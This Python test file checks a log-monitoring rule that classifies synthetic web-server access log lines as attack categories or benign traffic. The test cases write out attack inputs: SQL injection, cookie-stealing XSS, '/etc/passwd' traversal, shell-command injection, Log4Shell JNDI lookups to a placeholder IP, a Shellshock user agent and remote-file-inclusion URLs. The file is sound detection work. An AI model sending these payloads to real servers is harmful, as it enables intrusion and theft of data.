"""Classifier table: real-looking access log lines and the categories they must (not) fall in."""

from pathlib import Path

import pytest

from logsentry.models import Severity
from logsentry.parsers import nginx
from logsentry.parsers.iis import W3CParser
from logsentry.rules.web_attack import WebAttack

PATTERNS = Path(__file__).parent.parent / "config" / "web_patterns.yaml"
RULE = WebAttack(
    WebAttack.Config.model_validate({"patterns_file": PATTERNS, "group_gap_seconds": 1800})
)
BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36"


def line(target, ua=BROWSER, status=200):
    return (
        f'203.0.113.40 - - [22/Oct/2026:14:10:00 +0000] "GET {target} HTTP/1.1" {status} 512'
        f' "-" "{ua}"'
    )


def classify(raw):
    return {k: m.pattern for k, m in RULE.classify(nginx.parse_line(raw)).items()}


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # SQL injection
        (line("/item?id=1%20UNION%20SELECT%20user,pass%20FROM%20users"), {"sqli": "union_select"}),
        (line("/item?id=1/**/union/**/all/**/select/**/1"), {"sqli": "union_select"}),
        (line("/login?user=admin%27%20or%201=1--%20-"), {"sqli": "quote_or_and"}),
        (line("/login?user=x%2527%2520or%2520%2527a%2527%253d%2527a"), {"sqli": "quote_or_and"}),
        (line("/item?id=1%20AND%20SLEEP(5)"), {"sqli": "time_delay"}),
        (line("/item?id=1+and+benchmark(5000000,md5(1))"), {"sqli": "time_delay"}),
        (
            line("/item?id=-1+union+select+table_name+from+information_schema.tables"),
            {"sqli": "union_select"},
        ),
        (
            line("/item?id=1+and+(select+1+from+information_schema.tables)"),
            {"sqli": "information_schema"},
        ),
        (line("/item?id=1%27--"), {"sqli": "comment_after_quote"}),
        # XSS
        (line("/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E"), {"xss": "script_tag"}),
        (line("/search?q=%253Cscript%253Ex%253C%252Fscript%253E"), {"xss": "script_tag"}),
        (line("/search?q=%3Cimg%20src=x%20onerror=prompt(1)%3E"), {"xss": "html_tag"}),
        (line("/go?url=javascript:void(0)"), {"xss": "javascript_uri"}),
        (line("/p?name=x%22%20onmouseover=%22steal()"), {"xss": "event_handler"}),
        (line("/p?name=alert(1)"), {"xss": "alert_call"}),
        # path traversal / LFI
        (line("/download?file=../../../../etc/passwd"), {"path_traversal": "dot_dot_slash"}),
        (
            line("/download?file=%252e%252e%252f%252e%252e%252fetc%252fshadow"),
            {"path_traversal": "dot_dot_slash"},
        ),
        (
            line("/download?file=..%25252f..%25252fwin.ini"),
            {"path_traversal": "encoded_dot_dot_slash"},
        ),
        (line("/index.php?page=/etc/passwd"), {"path_traversal": "system_file"}),
        (
            line("/index.php?page=php://filter/convert.base64-encode/resource=index"),
            {"path_traversal": "php_wrapper"},
        ),
        (line("/view?doc=file:///etc/hosts"), {"path_traversal": "system_file"}),
        (line("/view?doc=file:///var/www/config"), {"path_traversal": "file_uri"}),
        # remote file inclusion
        (
            line("/rfi/view.php?var=http://198.51.100.5/shell.txt"),
            {"rfi": "remote_script_param"},
        ),
        # command injection
        (line("/ping?host=127.0.0.1;id"), {"command_injection": "separator_command"}),
        (line("/ping?host=127.0.0.1%7Cwhoami"), {"command_injection": "separator_command"}),
        (line("/ping?host=$(uname%20-a)"), {"command_injection": "subshell"}),
        (line("/ping?host=%60id%60"), {"command_injection": "backticks"}),
        (line("/cgi-bin/x?cmd=/bin/sh%20-i"), {"command_injection": "unix_shell"}),
        # Log4Shell / Shellshock, in the URL or the User-Agent
        (line("/?x=%24%7Bjndi:ldap://198.51.100.5/a%7D"), {"log4shell_shellshock": "jndi_lookup"}),
        (line("/", ua="${jndi:ldap://198.51.100.5/a}"), {"log4shell_shellshock": "jndi_lookup_ua"}),
        (
            line("/", ua="${${lower:j}ndi:ldap://198.51.100.5/a}"),
            {"log4shell_shellshock": "nested_lookup_ua"},
        ),
        (
            line("/cgi-bin/status", ua="() { :; }; echo; /bin/cat /etc/passwd"),
            {"log4shell_shellshock": "shellshock_ua"},
        ),
        # sensitive file probing
        (line("/.env", status=404), {"sensitive_file": "dotenv"}),
        (line("/.git/config", status=404), {"sensitive_file": "vcs_dir"}),
        (line("/wp-config.php.bak", status=404), {"sensitive_file": "wp_config"}),
        (line("/.htaccess", status=403), {"sensitive_file": "htaccess"}),
        (line("/phpMyAdmin/index.php", status=404), {"sensitive_file": "phpmyadmin"}),
        (line("/index.php.old", status=404), {"sensitive_file": "backup_suffix"}),
        (line("/backup.tar.gz", status=404), {"sensitive_file": "backup_archive"}),
        # scanner User-Agents
        (line("/", ua="sqlmap/1.8.4#stable (https://sqlmap.org)"), {"scanner_ua": "scanner_name"}),
        (
            line(
                "/",
                ua="Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            ),
            {"scanner_ua": "scanner_name"},
        ),
        (line("/", ua="gobuster/3.6"), {"scanner_ua": "scanner_name"}),
        (line("/", ua="Mozilla/5.0 zgrab/0.x"), {"scanner_ua": "scanner_name"}),
        (
            line(
                "/wp-login.php", ua="WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)"
            ),
            {"scanner_ua": "scanner_name"},
        ),
    ],
)
def test_attack_lines_are_classified(raw, expected):
    assert classify(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        line("/"),
        line("/search?q=blue+shoes&page=2"),
        line("/blog/2024--recap"),  # -- without a quote before it
        line("/search?q=select+a+union+rep"),  # words, not a UNION SELECT
        line("/search?q=o%27brien+and+sons"),  # an apostrophe in a name
        line("/env/settings"),
        line("/static/.environment.js"),
        line("/scripts/alert.js"),
        line("/login?next=https://www.example.test/account"),  # redirect target, not a script
        line("/api/items?sort=-price&limit=10"),
        line("/downloads/report.zip"),
        line("/docs/how-to-use-the-ls-command"),
        line("/products/id-card-holder"),
        line("/catalog?category=cats%26dogs"),
        line("/", ua="curl/8.10.1"),
        line("/", ua="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"),
    ],
)
def test_benign_lines_do_not_match(raw):
    assert classify(raw) == {}


def test_iis_line_is_classified():
    parser = W3CParser()
    parser.parse_line(
        "#Fields: date time c-ip cs-method cs-uri-stem cs-uri-query sc-status cs(User-Agent)"
    )
    event = parser.parse_line(
        "2026-10-22 14:48:06 203.0.113.21 GET /scripts/..%c1%9c../winnt/system32/cmd.exe"
        " /c+dir 200 Mozilla/4.0+(compatible;+MSIE+6.0)"
    )
    # %c1%9c (an overlong backslash) isn't valid UTF-8, but the "../" after it still gives it away
    assert set(RULE.classify(event)) == {"path_traversal", "command_injection"}


@pytest.mark.parametrize(
    ("base", "steps", "expected"),
    [
        (Severity.MEDIUM, 1, Severity.HIGH),
        (Severity.MEDIUM, -1, Severity.LOW),
        (Severity.MEDIUM, 0, Severity.MEDIUM),
        (Severity.CRITICAL, 1, Severity.CRITICAL),  # clamped
        (Severity.LOW, -1, Severity.LOW),  # clamped
        (Severity.HIGH, 1, Severity.CRITICAL),
    ],
)
def test_severity_shifts_within_low_and_critical(base, steps, expected):
    assert base.shifted(steps) == expected
